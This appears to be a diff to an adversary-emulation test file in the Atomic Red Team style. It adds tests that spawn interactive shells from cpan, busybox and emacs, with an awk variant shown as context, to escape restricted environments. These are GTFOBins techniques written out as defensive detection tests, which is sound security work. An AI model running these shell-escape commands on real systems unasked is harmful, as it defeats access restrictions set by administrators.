@@ -254,3 +254,46 @@ atomic_tests:
   executor:
     command: awk 'BEGIN {system("/bin/sh &")}'
     name: sh
+- name: Creating shell using cpan command
+  auto_generated_guid: bcd4c2bc-490b-4f91-bd31-3709fe75bbdf
+  description: |-
+    cpan lets you execute perl commands with the ! command. It can be used to break out from restricted environments by spawning an interactive system shell.
+    Reference - https://gtfobins.github.io/gtfobins/cpan/
+  supported_platforms:
+  - linux
+  - macos
+  executor:
+    command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
+    name: sh
+    elevation_required: false
+- name: Shell Creation using busybox command
+  auto_generated_guid: ab4d04af-68dc-4fee-9c16-6545265b3276
+  description: |-
+    BusyBox is a multi-call binary. A multi-call binary is an executable program that performs the same job as more than one utility program. It can be used to break out from restricted environments by spawning an interactive system shell. 
+    Reference - https://gtfobins.github.io/gtfobins/busybox/
+  supported_platforms:
+  - linux
+  executor:
+    command: busybox sh &
+    cleanup_command: 
+    name: sh
+    elevation_required: false  
+- name: emacs spawning an interactive system shell
+  auto_generated_guid: e0742e38-6efe-4dd4-ba5c-2078095b6156
+  description: |
+    emacs can be used to break out from restricted environments by spawning an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/  
+  supported_platforms:
+  - linux
+  - macos
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if emacs is installed on the machine.
+    prereq_command: |
+      if [ -x "$(command -v emacs)" ]; then echo "emacs is installed"; else echo "emacs is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      which apt && apt update && apt install -y emacs || which pkg && pkg update && pkg install -y emacs || which brew && brew update && brew install --quiet emacs
+  executor:
+    command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
+    name: sh
+    elevation_required: true
